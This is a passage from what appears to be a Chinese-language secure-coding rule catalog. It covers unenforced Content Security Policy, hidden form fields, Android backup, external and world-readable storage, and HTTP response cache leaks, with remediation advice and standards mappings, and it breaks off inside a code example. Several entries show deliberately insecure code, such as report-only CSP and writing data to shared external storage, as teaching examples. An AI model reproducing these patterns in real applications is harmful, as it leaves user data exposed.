<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[38] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="HTML5-Unenforced-Content-Security-Policy"><a href="#HTML5-Unenforced-Content-Security-Policy" class="headerlink" title="HTML5: Unenforced Content Security Policy"></a>HTML5: Unenforced Content Security Policy</h4><h5 id="ABSTRACT-12"><a href="#ABSTRACT-12" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>内容安全策略 (CSP) 在监控模式下完成配置，因而浏览器不会强制实施。</p>
<h5 id="EXPLANATION-12"><a href="#EXPLANATION-12" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>内容安全策略 (CSP) 是声明性安全标头，允许开发人员规定站点可从哪些域中加载内容，或呈现在 Web 浏览器中时向哪些域发起连接。它提供额外的安全层以避免重大漏洞，如 Cross-Site Scripting、Clickjacking、Cross-origin Access 等，此外还有输入验证以及代码中的白名单。 </p>
<p>Content-Security-Policy-Report-Only 标头可以让 Web 应用程序作者和管理员监控而不是强制实施安全策略。此标头通常用于试验和/或开发站点安全策略。假若策略有效，则可以转而使用 Content-Security-Policy 标头字段强制实施该策略。</p>
<p>示例 1：以下代码在 Report-Only 模式下设置内容安全策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-security-policy report-only=&quot;true&quot; policy-directives=&quot;default-src https://content.cdn.example.com&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-11"><a href="#RECOMMENDATIONS-11" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>配置并强制实施内容安全策略以缓解注入漏洞。</p>
<p>示例 2：以下代码在受 Spring Security 保护的应用程序中设置内容安全策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-security-policy policy-directives=&quot;default-src https://content.cdn.example.com&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/http&gt;</span><br></pre></td></tr></table></figure>
<p>内容安全策略并不用于解决所有内容注入漏洞，而是利用 CSP 来减少由内容注入攻击造成的损害。应定期执行防范编码实践，例如输入验证和输出编码。</p>
<h5 id="REFERENCES-12"><a href="#REFERENCES-12" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Content Security Policy </p>
<p>[2] W3C Content Security Policy 1.1 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[9] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[14] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="Hidden-Field"><a href="#Hidden-Field" class="headerlink" title="Hidden Field"></a>Hidden Field</h4><h5 id="ABSTRACT-13"><a href="#ABSTRACT-13" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序创建了一个隐藏的表单字段。</p>
<h5 id="EXPLANATION-13"><a href="#EXPLANATION-13" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序员通常信任隐藏字段的内容，认为用户不会查看它们或操作其内容。攻击者则会推翻这些假设。他们将检查写入隐藏字段的值，更改它们，或使用攻击数据替换这些内容。</p>
<p>示例：</p>
<p>  <code>Hidden hidden = new Hidden(element);</code></p>
<p>如果隐藏字段包含敏感信息，那么就会像捕捉该页面的其余部分一样捕捉这些信息。这会导致敏感信息在用户不知情的情况下在浏览器缓存中被隐藏起来。</p>
<h5 id="RECOMMENDATIONS-12"><a href="#RECOMMENDATIONS-12" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>注意攻击者将研究应用程序中使用的所有隐藏字段并对其进行解码。将隐藏字段视为不可信赖的输入。如果信息不能和页面其余部分一起缓存，不要在隐藏字段中存储这些信息。</p>
<h5 id="REFERENCES-13"><a href="#REFERENCES-13" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Input Validation and Representation Micro Focus Fortify</p>
<p>[2] IDS14-J. Do not trust the contents of hidden form fields CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 472, CWE ID 642</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage</p>
<p>[5] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 642</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3610 CAT I</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3610 CAT I</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3610 CAT I</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3610 CAT I</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3610 CAT I</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3610 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3610 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002485 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002485 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002485 CAT I</p>
<p>[16] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Insecure-Storage-Android-Backup-Storage"><a href="#Insecure-Storage-Android-Backup-Storage" class="headerlink" title="Insecure Storage: Android Backup Storage"></a>Insecure Storage: Android Backup Storage</h4><h5 id="ABSTRACT-14"><a href="#ABSTRACT-14" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序利用 Android 的备份服务将永久性应用程序数据保存到一个远程云存储中。</p>
<h5 id="EXPLANATION-14"><a href="#EXPLANATION-14" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Android 的备份服务可以使应用程序将永久性数据保存到一个远程云存储上，以便以后为应用程序数据提供一个恢复点。</p>
<p>通过将 allowBackup 属性设置为 true（默认值）并在 <application> 标签上定义 backupAgent 属性，可以为 Android 应用程序配置该备份服务。</application></p>
<p>但是，由于不同设备的云存储和传输方式不同，Android 并不保证您的数据在使用备份功能时的安全性。</p>
<h5 id="RECOMMENDATIONS-13"><a href="#RECOMMENDATIONS-13" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果您的应用程序包含敏感信息，请慎重使用备份功能存储敏感信息。此外，请谨记，由于 allowBackup 属性的默认值为 true，因此有必要明确将此属性设置为 false 以禁用备份。</p>
<h5 id="REFERENCES-14"><a href="#REFERENCES-14" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] JavaDoc for Android Android</p>
<p>[2] Android Developers API Guide: Data Backup Android</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 359</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Insecure-Storage-Android-External-Storage"><a href="#Insecure-Storage-Android-External-Storage" class="headerlink" title="Insecure Storage: Android External Storage"></a>Insecure Storage: Android External Storage</h4><h5 id="ABSTRACT-15"><a href="#ABSTRACT-15" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序将数据写入 Android 设备的外部存储。</p>
<h5 id="EXPLANATION-15"><a href="#EXPLANATION-15" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>保存到外部存储上的文件可随意读取，并且能够被启用 USB 海量存储来传输计算机上的文件的用户修改。另外，即便卸载了将文件写入外部存储卡的应用程序，这些文件也不会被删除。这些缺陷会危及写入存储的敏感信息，或者使攻击者能够通过修改程序所依赖的外部文件将恶意数据注入程序。</p>
<p>例 1：在以下代码中，Environment.getExternalStorageDirectory() 返回对 Android 设备外部存储的引用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">private void WriteToFile(String what_to_write) &#123;</span><br><span class="line"></span><br><span class="line">       try&#123;</span><br><span class="line"></span><br><span class="line">           File root = Environment.getExternalStorageDirectory();</span><br><span class="line"></span><br><span class="line">           if(root.canWrite()) &#123;</span><br><span class="line"></span><br><span class="line">               File dir = new File(root + &quot;write_to_the_SDcard&quot;);</span><br><span class="line"></span><br><span class="line">               File datafile = new File(dir, number + &quot;.extension&quot;);</span><br><span class="line"></span><br><span class="line">               FileWriter datawriter = new FileWriter(datafile);</span><br><span class="line"></span><br><span class="line">               BufferedWriter out = new BufferedWriter(datawriter);</span><br><span class="line"></span><br><span class="line">               out.write(what_to_write);</span><br><span class="line"></span><br><span class="line">               out.close();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-14"><a href="#RECOMMENDATIONS-14" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>写入应用程序特定的位置，例如应用程序的 SQLite 数据库。Android 完全支持 SQLite 数据库。应用程序内的任意类都可以按名称访问您所创建的任意数据库，应用程序外的类则无法访问。 例 2：通过创建 SQLiteOpenHelper 的子类和替代 OnCreate() 方法来创建一个新的 SQLite 数据库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    public class MyDbOpenHelper extends SQLiteOpenHelper &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    private static final int DATABASE_VERSION = 2;</span><br><span class="line"></span><br><span class="line">    private static final String DICTIONARY_TABLE_NAME = &quot;dictionary&quot;;</span><br><span class="line"></span><br><span class="line">    private static final String DICTIONARY_TABLE_CREATE =</span><br><span class="line"></span><br><span class="line">                &quot;CREATE TABLE &quot; + DICTIONARY_TABLE_NAME + &quot; (&quot; +</span><br><span class="line"></span><br><span class="line">                KEY_WORD + &quot; TEXT, &quot; +</span><br><span class="line"></span><br><span class="line">                KEY_DEFINITION + &quot; TEXT);&quot;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    DictionaryOpenHelper(Context context) &#123;</span><br><span class="line"></span><br><span class="line">        super(context, DATABASE_NAME, null, DATABASE_VERSION);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line"></span><br><span class="line">    public void onCreate(SQLiteDatabase db) &#123;</span><br><span class="line"></span><br><span class="line">        db.execSQL(DICTIONARY_TABLE_CREATE);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 3：或者，写入设备的内部存储。默认情况下，保存到内部存储的文件是 Android 应用程序专用的。其他 应用程序和用户均无法访问它们。用户卸载该应用程序时，这些文件将随之删除。 在下列代码中，我们创建了一个专用文件并将其写入内部存储。我们声明了 Context.MODE_PRIVATE。 MODE_PRIVATE 会创建一个文件（或替换同名文件），并使其成为您应用程序的专用文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String FILENAME = &quot;hello_file&quot;;</span><br><span class="line"></span><br><span class="line">String string = &quot;hello world!&quot;;</span><br><span class="line"></span><br><span class="line">FileOutputStream fos = openFileOutput(FILENAME, Context.MODE_PRIVATE);</span><br><span class="line"></span><br><span class="line">fos.write(string.getBytes());</span><br><span class="line"></span><br><span class="line">fos.close();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-15"><a href="#REFERENCES-15" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Data Storage</p>
<p>[2] Paul McNamara Latest ‘lost’ laptop holds treasure-trove of unencrypted ATT payroll data Network World</p>
<p>[3] Standards Mapping - FIPS200 MP</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[6] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II</p>
<p>[13] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Insecure-Storage-Android-World-Readable-or-Writeable"><a href="#Insecure-Storage-Android-World-Readable-or-Writeable" class="headerlink" title="Insecure Storage: Android World Readable or Writeable"></a>Insecure Storage: Android World Readable or Writeable</h4><h5 id="ABSTRACT-16"><a href="#ABSTRACT-16" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序使数据可供 Android 设备上的所有应用程序访问。</p>
<h5 id="EXPLANATION-16"><a href="#EXPLANATION-16" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 MODE_WORLD_READBLE 或 MODE_WORLD_WRITEABLE 存储在 Android 内部存储中的数据可供设备上的所有应用程序访问。这不仅无法防止数据损坏，而且如果是敏感信息的话，可能违反用户隐私和安全事宜。</p>
<h5 id="RECOMMENDATIONS-15"><a href="#RECOMMENDATIONS-15" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要使用可读或可写工具将敏感数据保存在 Android 内部存储中。同时，不建议用此模式进行跨进程通信。而应考虑使用 ContentProvider 根据具体情况来设定和赋予权限。</p>
<h5 id="REFERENCES-16"><a href="#REFERENCES-16" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Designing for Security Android</p>
<p>[2] S. Fahl, M. Harbach, T. Muders, M. Smith, L. Baumgartner, B. Friesleben Why Eve and Mallory Love Android:An Analysis of Android SSL (In)Security</p>
<p>[3] OWASP Top 10 Mobile Risks OWASP</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 359</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Insecure-Storage-HTTP-Response-Cache-Leak"><a href="#Insecure-Storage-HTTP-Response-Cache-Leak" class="headerlink" title="Insecure Storage: HTTP Response Cache Leak"></a>Insecure Storage: HTTP Response Cache Leak</h4><h5 id="ABSTRACT-17"><a href="#ABSTRACT-17" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>所述方法将 HTTP(S) 响应缓存安装在不安全的共享存储中。</p>
<h5 id="EXPLANATION-17"><a href="#EXPLANATION-17" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTTP(S) 响应中可能包含敏感数据，例如会话 Cookie 和 API 标记。 出于性能方面的考虑，URL 加载系统会对所有 HTTP(S) 响应进行缓存，将它们以未加密的形式存储在不安全的共享存储中。</p>
<p>示例 1： 以下代码将 HTTP(S) 响应缓存安装在共享存储空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        File httpCacheDir = new File(context.getExternalCacheDir(), &quot;http&quot;);</span><br><span class="line"></span><br><span class="line">        long httpCacheSize = 10 * 1024 * 1024; // 10 MiB</span><br><span class="line"></span><br><span class="line">        HttpResponseCache.install(httpCacheDir, httpCacheSize);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">        Log.i(TAG, &quot;HTTP response cache installation failed:&quot; + e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> protected void onStop() &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    HttpResponseCache cache = HttpResponseCache.getInstalled();</span><br><span class="line"></span><br><span class="line">    if (cache != null) &#123;</span><br><span class="line"></span><br><span class="line">        cache.flush();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-16"><a href="#RECOMMENDATIONS-16" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了防止第三方应用程序访问包含敏感数据的 HTTP(S) 响应，将缓存安装在专用的用户存储空间。</p>
<p>示例 2： 以下代码将 HTTP(S) 响应缓存安装在专用的用户空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 